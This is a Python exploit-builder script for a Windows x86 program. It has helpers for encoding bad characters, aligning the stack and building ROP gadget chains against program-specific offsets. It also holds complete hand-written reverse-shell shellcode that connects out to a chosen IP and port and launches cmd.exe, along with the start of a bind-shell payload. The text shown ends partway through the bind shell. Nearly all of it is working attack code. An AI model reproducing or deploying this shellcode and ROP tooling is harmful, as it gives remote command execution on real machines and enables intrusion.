#!/usr/bin/python3
import sys
from struct import pack, unpack
import argparse
import socket
import os
import traceback
import time
import binascii
import ipaddress

# Global vars
host = None
port = None
timeout = None
sock = None

# Badchars
badchars = [ 0x0 , 0xa, 0xd]  
ropjunk = 0x60606060

class Colors:
    """ ANSI color codes """
    BLACK = "\033[0;30m"
    RED = "\033[0;31m"
    GREEN = "\033[0;32m"
    BROWN = "\033[0;33m"
    BLUE = "\033[0;34m"
    PURPLE = "\033[0;35m"
    CYAN = "\033[0;36m"
    LIGHT_GRAY = "\033[0;37m"
    DARK_GRAY = "\033[1;30m"
    LIGHT_RED = "\033[1;31m"
    LIGHT_GREEN = "\033[1;32m"
    YELLOW = "\033[1;33m"
    LIGHT_BLUE = "\033[1;34m"
    LIGHT_PURPLE = "\033[1;35m"
    LIGHT_CYAN = "\033[1;36m"
    LIGHT_WHITE = "\033[1;37m"
    BOLD = "\033[1m"
    FAINT = "\033[2m"
    ITALIC = "\033[3m"
    UNDERLINE = "\033[4m"
    BLINK = "\033[5m"
    NEGATIVE = "\033[7m"
    CROSSED = "\033[9m"
    END = "\033[0m"
    # cancel SGR codes if we don't write to a terminal
    if not __import__("sys").stdout.isatty():
        for _ in dir():
            if isinstance(_, str) and _[0] != "_":
                locals()[_] = ""
    else:
        # set Windows console in VT mode
        if __import__("platform").system() == "Windows":
            kernel32 = __import__("ctypes").windll.kernel32
            kernel32.SetConsoleMode(kernel32.GetStdHandle(-11), 7)
            del kernel32

class Helpers:
    def scAlignASM(offsetsc):
        """
        Aligns ESP with a specified offset using ASM instructions. Supports both ADD and SUB operations.
        """
        max_add_byte = 0x7f   # Maximum value that can be added/subtracted in a single instruction
        strip_null = True     # Strip off NULL bytes when converting to hex

        # Byte definitions for ADD and SUB operations
        max_add_ax = b"\x66\x83\xc0\x7f"  # ADD AX, 0x7f (Maximum ADD AX value)
        prefix_add_ax = b"\x66\x83"       # Prefix for ADD AX
        prefix_sub_ax = b"\x66\x83\xc8"   # Prefix for SUB AX
        prefix_add_al = b"\x04"           # Prefix for ADD AL
        prefix_sub_al = b"\x2c"           # Prefix for SUB AL

        # Calculate optimal operation (ADD or SUB)
        use_addition = offsetsc >= 0      # Use ADD for positive offset, SUB for negative
        offset_abs = abs(offsetsc)

        # Calculate values for alignment
        num_max_instructions = offset_abs // max_add_byte  # Number of full 0x7f adjustments
        remaining_offset = offset_abs % max_add_byte       # Remaining offset to align

        # Create buffer of full max adjustments
        if use_addition:
            buf_max_instructions = max_add_ax * num_max_instructions
        else:
            buf_max_instructions = max_add_ax.replace(b"\xc0", b"\xc8") * num_max_instructions

        # Convert remaining offset to byte
        suffix_byte = Helpers.toByteHex(hex(remaining_offset), strip_null)[::-1]

        # Align buffer
        alignsc = b""
        alignsc += b"\x54"  # PUSH ESP
        alignsc += b"\x58"  # POP EAX
        alignsc += buf_max_instructions

        if remaining_offset > 0:
            if use_addition:
                alignsc += prefix_add_al + suffix_byte
            else:
                alignsc += prefix_sub_al + suffix_byte

        alignsc += b"\x50"  # PUSH EAX
        alignsc += b"\x5c"  # POP ESP

        return alignsc
    
    def colorBadbytes(originalsc, encodedsc):
        outsclines = []
        outrplines = []
        outwidth = 40
        lenhex = 4

        # Badchars
        badchars = Badchars.programbadchars
        
        # Convert badchar bytes to pretty "\x" encoded string
        prettyBadchars = Helpers.convertPrettyHex(badchars)
        # Already mapped during earlier calls; make sure to do so, if not
        mappedBadchars = Shellcode.mappedbadscchars

        # Strip per 4 chars for hex prefixed output
        bclines = [prettyBadchars[i:i + lenhex] for i in range(0, len(prettyBadchars), lenhex)]
        sclines = [originalsc[i:i + lenhex] for i in range(0, len(originalsc), lenhex)]
        eclines = [encodedsc[i:i + lenhex] for i in range(0, len(encodedsc), lenhex)]

        # Compare if badchars show up in shellcode and color if so
        # Check and color badchars
        outsclines.append("original_shellcode = (\n\tb\"")
        sccolor = ""
        for i, char in enumerate(sclines, 1):
            # Add bad char colored red
            if char in bclines:
                colorchar = Colors.RED + char + Colors.END
            else:
                colorchar = char
            
            sccolor += colorchar + ('"\n\tb"' if i % outwidth == 0 else '')

        outsclines.append(sccolor + "\"\n)\n")
        coloredsc = ''.join(outsclines)

        # Check and color replaced chars
        outrplines.append("encoded_shellcode = (\n\tb\"")
        sccolor = ""    
        for i, char in enumerate(eclines, 1):
            # Add replacement char colored green
            if i - 1 in mappedBadchars:
                colorchar = Colors.GREEN + char + Colors.END
            else:
                colorchar = char
            
            sccolor += colorchar + ('"\n\tb"' if i % outwidth == 0 else '')

        outrplines.append(sccolor + "\"\n)\n")
        coloredrp = ''.join(outrplines)      

        return coloredsc, coloredrp

    def decodeShellcode(intbase, selectedsc, offsetDecoding):
        # Loop over badchar indexes
        restoreRop = []
        replacements = Badchars.replacements
        badIndices = Shellcode.mappedbadscchars
        badchars_count = len(badchars)

        for i in range(len(badIndices)):          
            # Calculate offset from previous badchar to current
            offset = badIndices[i] if i == 0 else badIndices[i] - badIndices[i - 1]
            neg_offset = (-offset) & 0xffffffff
            value = 0          
                
            # Iterate over every bad char & add offset to all of them  
            value = next((replacements[j] for j in range(badchars_count) if selectedsc[badIndices[i]] == badchars[j]), 0)
            
            # ROP; program specific
            # Value in BH to add; shift left 8 bits using OR
            negoffsetDecoding = offsetDecoding & 0xff
            value = ((value + negoffsetDecoding) << 8) | 0x11110011
                
            # ROP; program specific
            restoreRop_gadgets = [
                # get offset to next bad char into ecx
                intbase + 0x117c,    # pop ecx ; ret
                neg_offset,
                # adjust eax by this offset to point to next bad char
                intbase + 0x4a7b6,   # sub eax, ecx ; pop ebx ; ret
                value,
                intbase + 0x468ee,   # add [eax+1], bh ; ret
            ]
            restoreRop.extend(restoreRop_gadgets)

        return restoreRop
    
    def encodeShellcode(sh,offsetEncoding):
        replacements = []
        badchars = Badchars.programbadchars
        for c in badchars:
            new = c + offsetEncoding
            if new < 0:
                new += 256
            replacements.append(new)
    
        print("[*] Badchars:     " + Colors.RED + Helpers.convertPrettyHex(badchars) + Colors.END)
        print("[*] Replacements: " + Colors.GREEN + Helpers.convertPrettyHex(replacements) + "\n" + Colors.END)
        badchars = bytes(badchars)
        replacements = bytes(replacements)

        transTable = sh.maketrans(badchars, replacements)
        encodedsh = sh.translate(transTable)
        hexencodedsh = Helpers.convertPrettyHex(encodedsh)
        Badchars.replacements = replacements
        
        return encodedsh,hexencodedsh

    def mapandconvertShellcode(selectedsc,offsetEncoding):
        # Program bad chars
        Badchars.programbadchars = badchars
        # Check shellcode and map bad characters
        Shellcode.mappedbadscchars = Helpers.mapBadChars(selectedsc)
        # Encode shellcode
        Shellcode.encodedShellcode,Shellcode.encodedShellcodeHex = Helpers.encodeShellcode(selectedsc,offsetEncoding)
        # Color characters for both original bad and encoded chars
        selectedschex = Helpers.convertPrettyHex(selectedsc)
        encodedschex = Shellcode.encodedShellcodeHex
        encodedsc = Shellcode.encodedShellcode
        coloredoriginalsc,coloredencodedsc = Helpers.colorBadbytes(selectedschex,encodedschex)
        print("Original shellcode: \n" + coloredoriginalsc)
        print("Encoded shellcode: \n" + coloredencodedsc)
        return encodedsc  

    def mapBadChars(sh):
        i = 0
        badIndex = []

        while i < len(sh):
            for c in badchars:
                if sh[i] == c:
                    badIndex.append(i)
            i=i+1
        return badIndex

    def containsBadchars(hexaddr,checkhalf=False):
        startchar = 2
        endchar = 2
        if checkhalf == 'upper':
            checkhex = hexaddr[:startchar]
        elif checkhalf == 'lower':
            checkhex = hexaddr[endchar:]
        else:
            checkhex = hexaddr
        strBadAddress = '0x' + binascii.hexlify(checkhex).decode('ascii')
        for char in checkhex:
            if char in badchars:
                print("[-] Error: bad character " + str(char) + " in returned address " + str(strBadAddress))
                return True
        return False

    def toByteHex(hexaddr,stripnull = False):
        """
        DESCR: Converts a hexaddress in stringformat to bytes
        IN: String hex address; 0x12345678
        OUT: Byte address
        """
        lenAddr = 8
        toByteHex = bytes.fromhex(hexaddr.lstrip('0x').rjust(lenAddr, '0'))
        if stripnull:
            toByteHex = toByteHex.lstrip(b"\x00")
        return toByteHex

    def convertPrettyHex(sh):
        """
        DESCR: Prefix each shellcode char with \\x
        IN: Shellcode
        OUT: \\x prefixed shellcode
        """
        hexencoded = "".join(map('\\x{:02x}'.format, sh))
        return hexencoded

    def negate(val, nbits=32):
        """
        Compute the two's complement negation of an integer within a specified bit-width.
        Args:
            val (int): The integer value to negate.
            nbits (int): The number of bits for the representation (default is 32 bits).
        Returns: int: The negated integer, wrapped within the specified bit-width.
        """
        return (val + (1 << nbits)) % (1 << nbits)

    def addhex(offset, nbits = 32):
        largeVal = 0x88888888
        val = offset - largeVal
        return (val + (1 << nbits)) % (1 << nbits)

    def keyboard_interrupt():
        """Handles keyboardinterrupt exceptions"""""
        print("\n\n[*] User requested an interrupt, exiting...")
        exit(0)

class Badchars:
    def programbadchars():
        i = 0
        programbadChars = []

        for c in badchars:
            programbadChars.append(i)
        return programbadChars
    
    def replacements():
        i = 0
        programbadscReplace = []

        for c in badchars:
            programbadscReplace.append(i)
        return programbadscReplace
    
    def allchars():
        chars = (
            b"\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
            b"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f"
            b"\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
            b"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
            b"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
            b"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
            b"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
            b"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff" )
        return chars
    
    def defaultbadchars():
        # Not including "\x0a\x0d\x00"
        chars = (
            b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0b\x0c\x0e\x0f\x10"
            b"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
            b"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
            b"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
            b"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
            b"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
            b"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
            b"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
            b"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
            b"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
            b"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
            b"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
            b"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
            b"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
            b"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
            b"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff" )
        return chars
    
class Shellcode:
    def asmrevshellShellcode(revip,revport):
        # Custom revshell, hacky port and ip vars
        # Generated using https://raw.githubusercontent.com/hodor-sec/Shellcoding/master/generic/asm_assemble_disassemble.py
        
        # Validate inputs
        if not revip or not revport:
            print("[!] Error: Empty IP address or port entered for payload. Exiting...")
            sys.exit(0)
        try:
            # Convert IP address to bytes
            ip = int(ipaddress.IPv4Address(revip)).to_bytes(4, byteorder='big')
        except ipaddress.AddressValueError:
            print(f"[!] Error: Invalid IP address '{revip}'. Exiting...")
            sys.exit(0)

        if not (1 <= revport <= 65535):
            print(f"[!] Error: Invalid port '{revport}'. Must be between 1 and 65535. Exiting...")
            sys.exit(0)

        # Convert port to bytes
        port = revport.to_bytes(2, byteorder='big')  # Port is always 2 bytes in network byte order

        # Generate assembly for IP and Port
        asmip = b"\x68" + ip  # push IP
        asmport = b"\x66\xb8" + port  # mov ax, PORT
        
        shellcode = (
                b"\x89\xe5"                        # 0x0         mov  ebp, esp
                b"\x81\xc4\xf0\xf9\xff\xff"        # 0x2         add  esp, 0xfffff9f0
                b"\x31\xc9"                        # 0x8         xor  ecx, ecx
                b"\x64\x8b\x71\x30"                # 0x10        mov  esi, dword ptr fs:[ecx + 0x30]
                b"\x8b\x76\x0c"                    # 0x14        mov  esi, dword ptr [esi + 0xc]
                b"\x8b\x76\x1c"                    # 0x17        mov  esi, dword ptr [esi + 0x1c]
                b"\x8b\x5e\x08"                    # 0x20        mov  ebx, dword ptr [esi + 8]
                b"\x8b\x7e\x20"                    # 0x23        mov  edi, dword ptr [esi + 0x20]
                b"\x8b\x36"                        # 0x26        mov  esi, dword ptr [esi]
                b"\x66\x39\x4f\x18"                # 0x28        cmp  word ptr [edi + 0x18], cx
                b"\x75\xf2"                        # 0x32        jne  0x14
                b"\xeb\x06"                        # 0x34        jmp  0x2a
                b"\x5e"                            # 0x36        pop  esi
                b"\x89\x75\x04"                    # 0x37        mov  dword ptr [ebp + 4], esi
                b"\xeb\x54"                        # 0x40        jmp  0x7e
                b"\xe8\xf5\xff\xff\xff"            # 0x42        call 0x24
                b"\x60"                            # 0x47        pushal
                b"\x8b\x43\x3c"                    # 0x48        mov  eax, dword ptr [ebx + 0x3c]
                b"\x8b\x7c\x03\x78"                # 0x51        mov  edi, dword ptr [ebx + eax + 0x78]
                b"\x01\xdf"                        # 0x55        add  edi, ebx
                b"\x8b\x4f\x18"                    # 0x57        mov  ecx, dword ptr [edi + 0x18]
                b"\x8b\x47\x20"                    # 0x60        mov  eax, dword ptr [edi + 0x20]
                b"\x01\xd8"                        # 0x63        add  eax, ebx
                b"\x89\x45\xfc"                    # 0x65        mov  dword ptr [ebp - 4], eax
                b"\xe3\x36"                        # 0x68        jecxz0x7c
                b"\x49"                            # 0x70        dec  ecx
                b"\x8b\x45\xfc"                    # 0x71        mov  eax, dword ptr [ebp - 4]
                b"\x8b\x34\x88"                    # 0x74        mov  esi, dword ptr [eax + ecx*4]
                b"\x01\xde"                        # 0x77        add  esi, ebx
                b"\x31\xc0"                        # 0x79        xor  eax, eax
                b"\x99"                            # 0x81        cdq
                b"\xfc"                            # 0x82        cld
                b"\xac"                            # 0x83        lodsbal, byte ptr [esi]
                b"\x84\xc0"                        # 0x84        test al, al
                b"\x74\x07"                        # 0x86        je   0x5f
                b"\xc1\xca\x0d"                    # 0x88        ror  edx, 0xd
                b"\x01\xc2"                        # 0x91        add  edx, eax
                b"\xeb\xf4"                        # 0x93        jmp  0x53
                b"\x3b\x54\x24\x24"                # 0x95        cmp  edx, dword ptr [esp + 0x24]
                b"\x75\xdf"                        # 0x99        jne  0x44
                b"\x8b\x57\x24"                    # 0x101       mov  edx, dword ptr [edi + 0x24]
                b"\x01\xda"                        # 0x104       add  edx, ebx
                b"\x66\x8b\x0c\x4a"                # 0x106       mov  cx, word ptr [edx + ecx*2]
                b"\x8b\x57\x1c"                    # 0x110       mov  edx, dword ptr [edi + 0x1c]
                b"\x01\xda"                        # 0x113       add  edx, ebx
                b"\x8b\x04\x8a"                    # 0x115       mov  eax, dword ptr [edx + ecx*4]
                b"\x01\xd8"                        # 0x118       add  eax, ebx
                b"\x89\x44\x24\x1c"                # 0x120       mov  dword ptr [esp + 0x1c], eax
                b"\x61"                            # 0x124       popal
                b"\xc3"                            # 0x125       ret
                b"\x68\x83\xb9\xb5\x78"            # 0x126       push 0x78b5b983
                b"\xff\x55\x04"                    # 0x131       call dword ptr [ebp + 4]
                b"\x89\x45\x10"                    # 0x134       mov  dword ptr [ebp + 0x10], eax
                b"\x68\x8e\x4e\x0e\xec"            # 0x137       push 0xec0e4e8e
                b"\xff\x55\x04"                    # 0x142       call dword ptr [ebp + 4]
                b"\x89\x45\x14"                    # 0x145       mov  dword ptr [ebp + 0x14], eax
                b"\x68\x72\xfe\xb3\x16"            # 0x148       push 0x16b3fe72
                b"\xff\x55\x04"                    # 0x153       call dword ptr [ebp + 4]
                b"\x89\x45\x18"                    # 0x156       mov  dword ptr [ebp + 0x18], eax
                b"\x31\xc0"                        # 0x159       xor  eax, eax
                b"\x66\xb8\x6c\x6c"                # 0x161       mov  ax, 0x6c6c
                b"\x50"                            # 0x165       push eax
                b"\x68\x33\x32\x2e\x64"            # 0x166       push 0x642e3233
                b"\x68\x77\x73\x32\x5f"            # 0x171       push 0x5f327377
                b"\x54"                            # 0x176       push esp
                b"\xff\x55\x14"                    # 0x177       call dword ptr [ebp + 0x14]
                b"\x89\xc3"                        # 0x180       mov  ebx, eax
                b"\x68\xcb\xed\xfc\x3b"            # 0x182       push 0x3bfcedcb
                b"\xff\x55\x04"                    # 0x187       call dword ptr [ebp + 4]
                b"\x89\x45\x1c"                    # 0x190       mov  dword ptr [ebp + 0x1c], eax
                b"\x68\xd9\x09\xf5\xad"            # 0x193       push 0xadf509d9
                b"\xff\x55\x04"                    # 0x198       call dword ptr [ebp + 4]
                b"\x89\x45\x20"                    # 0x201       mov  dword ptr [ebp + 0x20], eax
                b"\x68\x0c\xba\x2d\xb3"            # 0x204       push 0xb32dba0c
                b"\xff\x55\x04"                    # 0x209       call dword ptr [ebp + 4]
                b"\x89\x45\x24"                    # 0x212       mov  dword ptr [ebp + 0x24], eax
                b"\x31\xdb"                        # 0x215       xor  ebx, ebx
                b"\x66\xbb\x90\x01"                # 0x217       mov  bx, 0x190
                b"\x29\xdc"                        # 0x221       sub  esp, ebx
                b"\x54"                            # 0x223       push esp
                b"\x83\xc3\x72"                    # 0x224       add  ebx, 0x72
                b"\x53"                            # 0x227       push ebx
                b"\xff\x55\x1c"                    # 0x228       call dword ptr [ebp + 0x1c]
                b"\x31\xc0"                        # 0x231       xor  eax, eax
                b"\x50"                            # 0x233       push eax
                b"\x50"                            # 0x234       push eax
                b"\x50"                            # 0x235       push eax
                b"\xb0\x06"                        # 0x236       mov  al, 6
                b"\x50"                            # 0x238       push eax
                b"\x2c\x05"                        # 0x239       sub  al, 5
                b"\x50"                            # 0x241       push eax
                b"\x40"                            # 0x242       inc  eax
                b"\x50"                            # 0x243       push eax
                b"\xff\x55\x20"                    # 0x244       call dword ptr [ebp + 0x20]
                b"\x89\xc6"                        # 0x247       mov  esi, eax
                b"\x31\xc0"                        # 0x249       xor  eax, eax
                b"\x50"                            # 0x251       push eax
                b"\x50"                            # 0x252       push eax
                b"" + asmip + b""
                b"" + asmport + b""
                b"\xc1\xe0\x10"                    # 0x262       shl  eax, 0x10
                b"\x66\x83\xc0\x02"                # 0x265       add  ax, 2
                b"\x50"                            # 0x269       push eax
                b"\x54"                            # 0x270       push esp
                b"\x5f"                            # 0x271       pop  edi
                b"\x31\xc0"                        # 0x272       xor  eax, eax
                b"\x50"                            # 0x274       push eax
                b"\x50"                            # 0x275       push eax
                b"\x50"                            # 0x276       push eax
                b"\x50"                            # 0x277       push eax
                b"\x04\x10"                        # 0x278       add  al, 0x10
                b"\x50"                            # 0x280       push eax
                b"\x57"                            # 0x281       push edi
                b"\x56"                            # 0x282       push esi
                b"\xff\x55\x24"                    # 0x283       call dword ptr [ebp + 0x24]
                b"\x56"                            # 0x286       push esi
                b"\x56"                            # 0x287       push esi
                b"\x56"                            # 0x288       push esi
                b"\x31\xc0"                        # 0x289       xor  eax, eax
                b"\x50"                            # 0x291       push eax
                b"\x50"                            # 0x292       push eax
                b"\xb8\xfe\xfe\xff\xff"            # 0x293       mov  eax, 0xfffffefe
                b"\xf7\xd8"                        # 0x298       neg  eax
                b"\x50"                            # 0x300       push eax
                b"\x31\xc0"                        # 0x301       xor  eax, eax
                b"\x50"                            # 0x303       push eax
                b"\x50"                            # 0x304       push eax
                b"\x50"                            # 0x305       push eax
                b"\x50"                            # 0x306       push eax
                b"\x50"                            # 0x307       push eax
                b"\x50"                            # 0x308       push eax
                b"\x50"                            # 0x309       push eax
                b"\x50"                            # 0x310       push eax
                b"\x50"                            # 0x311       push eax
                b"\x50"                            # 0x312       push eax
                b"\xb0\x44"                        # 0x313       mov  al, 0x44
                b"\x50"                            # 0x315       push eax
                b"\x54"                            # 0x316       push esp
                b"\x5f"                            # 0x317       pop  edi
                b"\xb8\x9b\x87\x9a\xff"            # 0x318       mov  eax, 0xff9a879b
                b"\xf7\xd8"                        # 0x323       neg  eax
                b"\x50"                            # 0x325       push eax
                b"\x68\x63\x6d\x64\x2e"            # 0x326       push 0x2e646d63
                b"\x54"                            # 0x331       push esp
                b"\x5b"                            # 0x332       pop  ebx
                b"\x89\xe0"                        # 0x333       mov  eax, esp
                b"\x31\xc9"                        # 0x335       xor  ecx, ecx
                b"\x66\x81\xc1\x90\x03"            # 0x337       add  cx, 0x390
                b"\x29\xc8"                        # 0x342       sub  eax, ecx
                b"\x50"                            # 0x344       push eax
                b"\x57"                            # 0x345       push edi
                b"\x31\xc0"                        # 0x346       xor  eax, eax
                b"\x50"                            # 0x348       push eax
                b"\x50"                            # 0x349       push eax
                b"\x50"                            # 0x350       push eax
                b"\x40"                            # 0x351       inc  eax
                b"\x50"                            # 0x352       push eax
                b"\x48"                            # 0x353       dec  eax
                b"\x50"                            # 0x354       push eax
                b"\x50"                            # 0x355       push eax
                b"\x53"                            # 0x356       push ebx
                b"\x50"                            # 0x357       push eax
                b"\xff\x55\x18"                    # 0x358       call dword ptr [ebp + 0x18]
                b"\x31\xc9"                        # 0x361       xor  ecx, ecx
                b"\x51"                            # 0x363       push ecx
                b"\x6a\xff"                        # 0x364       push -1
                b"\xff\x55\x10"                    # 0x366       call dword ptr [ebp + 0x10]
        )
        return shellcode

    def asmbindshellcode(hostport, hostip = False):
        # Custom bindshell, hacky port and ip vars
        # Generated using https://raw.githubusercontent.com/hodor-sec/Shellcoding/master/generic/asm_assemble_disassemble.py
        # Validate port
        if not hostport or not (1 <= hostport <= 65535):
            print(f"[!] Error: Invalid or missing port '{hostport}'. Port must be between 1 and 65535. Exiting...")
            sys.exit(0)

        # Handle IP address
        try:
            if hostip:
                ip = int(ipaddress.IPv4Address(hostip)).to_bytes(4, byteorder='big')
            else:
                # Default to listening on all interfaces
                ip = int(ipaddress.IPv4Address("0.0.0.0")).to_bytes(4, byteorder='big')
        except ipaddress.AddressValueError:
            print(f"[!] Error: Invalid IP address '{hostip}'. Exiting...")
            sys.exit(0)

        # Convert port to 2 bytes
        port = hostport.to_bytes(2, byteorder='big')  # Port is always 2 bytes in network byte order

        # Generate assembly for IP and Port
        asmip = b"\x68" + ip  # push IP
        asmport = b"\x66\xb8" + port  # mov ax, PORT
            
        shellcode = (
            b"\x89\xe5"                        # 0x0         mov  ebp, esp
            b"\x81\xc4\xf0\xf9\xff\xff"        # 0x2         add  esp, 0xfffff9f0
            b"\x31\xc9"                        # 0x8         xor  ecx, ecx
            b"\x64\x8b\x71\x30"                # 0x10        mov  esi, dword ptr fs:[ecx + 0x30]
            b"\x8b\x76\x0c"                    # 0x14        mov  esi, dword ptr [esi + 0xc]
            b"\x8b\x76\x1c"                    # 0x17        mov  esi, dword ptr [esi + 0x1c]
            b"\x8b\x5e\x08"                    # 0x20        mov  ebx, dword ptr [esi + 8]
            b"\x8b\x7e\x20"                    # 0x23        mov  edi, dword ptr [esi + 0x20]
            b"\x8b\x36"                        # 0x26        mov  esi, dword ptr [esi]
            b"\x66\x39\x4f\x18"                # 0x28        cmp  word ptr [edi + 0x18], cx
            b"\x75\xf2"                        # 0x32        jne  0x14
            b"\xeb\x06"                        # 0x34        jmp  0x2a
            b"\x5e"                            # 0x36        pop  esi
            b"\x89\x75\x04"                    # 0x37        mov  dword ptr [ebp + 4], esi
            b"\xeb\x54"                        # 0x40        jmp  0x7e
            b"\xe8\xf5\xff\xff\xff"            # 0x42        call 0x24
            b"\x60"                            # 0x47        pushal
            b"\x8b\x43\x3c"                    # 0x48        mov  eax, dword ptr [ebx + 0x3c]
            b"\x8b\x7c\x03\x78"                # 0x51        mov  edi, dword ptr [ebx + eax + 0x78]
            b"\x01\xdf"                        # 0x55        add  edi, ebx
            b"\x8b\x4f\x18"                    # 0x57        mov  ecx, dword ptr [edi + 0x18]
            b"\x8b\x47\x20"                    # 0x60        mov  eax, dword ptr [edi + 0x20]
            b"\x01\xd8"                        # 0x63        add  eax, ebx
            b"\x89\x45\xfc"                    # 0x65        mov  dword ptr [ebp - 4], eax
            b"\xe3\x36"                        # 0x68        jecxz0x7c
            b"\x49"                            # 0x70        dec  ecx
            b"\x8b\x45\xfc"                    # 0x71        mov  eax, dword ptr [ebp - 4]
            b"\x8b\x34\x88"                    # 0x74        mov  esi, dword ptr [eax + ecx*4]
            b"\x01\xde"                        # 0x77        add  esi, ebx
            b"\x31\xc0"                        # 0x79        xor  eax, eax
            b"\x99"                            # 0x81        cdq
            b"\xfc"                            # 0x82        cld
            b"\xac"                            # 0x83        lodsbal, byte ptr [esi]
            b"\x84\xc0"                        # 0x84        test al, al
            b"\x74\x07"                        # 0x86        je   0x5f
            b"\xc1\xca\x0d"                    # 0x88        ror  edx, 0xd
            b"\x01\xc2"                        # 0x91        add  edx, eax
            b"\xeb\xf4"                        # 0x93        jmp  0x53
            b"\x3b\x54\x24\x24"                # 0x95        cmp  edx, dword ptr [esp + 0x24]
            b"\x75\xdf"                        # 0x99        jne  0x44
            b"\x8b\x57\x24"                    # 0x101       mov  edx, dword ptr [edi + 0x24]
            b"\x01\xda"                        # 0x104       add  edx, ebx
            b"\x66\x8b\x0c\x4a"                # 0x106       mov  cx, word ptr [edx + ecx*2]
            b"\x8b\x57\x1c"                    # 0x110       mov  edx, dword ptr [edi + 0x1c]
            b"\x01\xda"                        # 0x113       add  edx, ebx
            b"\x8b\x04\x8a"                    # 0x115       mov  eax, dword ptr [edx + ecx*4]
            b"\x01\xd8"                        # 0x118       add  eax, ebx
            b"\x89\x44\x24\x1c"                # 0x120       mov  dword ptr [esp + 0x1c], eax
            b"\x61"                            # 0x124       popal
            b"\xc3"                            # 0x125       ret
            b"\x68\x83\xb9\xb5\x78"            # 0x126       push 0x78b5b983
            b"\xff\x55\x04"                    # 0x131       call dword ptr [ebp + 4]
            b"\x89\x45\x10"                    # 0x134       mov  dword ptr [ebp + 0x10], eax
            b"\x68\x8e\x4e\x0e\xec"            # 0x137       push 0xec0e4e8e
            b"\xff\x55\x04"                    # 0x142       call dword ptr [ebp + 4]
            b"\x89\x45\x14"                    # 0x145       mov  dword ptr [ebp + 0x14], eax
            b"\x68\x72\xfe\xb3\x16"            # 0x148       push 0x16b3fe72
            b"\xff\x55\x04"                    # 0x153       call dword ptr [ebp + 4]
            b"\x89\x45\x18"                    # 0x156       mov  dword ptr [ebp + 0x18], eax
            b"\x31\xc0"                        # 0x159       xor  eax, eax
            b"\x66\xb8\x6c\x6c"                # 0x161       mov  ax, 0x6c6c
            b"\x50"                            # 0x165       push eax
            b"\x68\x33\x32\x2e\x64"            # 0x166       push 0x642e3233
            b"\x68\x77\x73\x32\x5f"            # 0x171       push 0x5f327377
            b"\x54"                            # 0x176       push esp
            b"\xff\x55\x14"                    # 0x177       call dword ptr [ebp + 0x14]
            b"\x89\xc3"                        # 0x180       mov  ebx, eax
            b"\x68\xcb\xed\xfc\x3b"            # 0x182       push 0x3bfcedcb
            b"\xff\x55\x04"                    # 0x187       call dword ptr [ebp + 4]
            b"\x89\x45\x1c"                    # 0x190       mov  dword ptr [ebp + 0x1c], eax
            b"\x68\xd9\x09\xf5\xad"            # 0x193       push 0xadf509d9
            b"\xff\x55\x04"                    # 0x198       call dword ptr [ebp + 4]
            b"\x89\x45\x20"                    # 0x201       mov  dword ptr [ebp + 0x20], eax
            b"\x68\x0c\xba\x2d\xb3"            # 0x204       push 0xb32dba0c
            b"\xff\x55\x04"                    # 0x209       call dword ptr [ebp + 4]
            b"\x89\x45\x24"                    # 0x212       mov  dword ptr [ebp + 0x24], eax
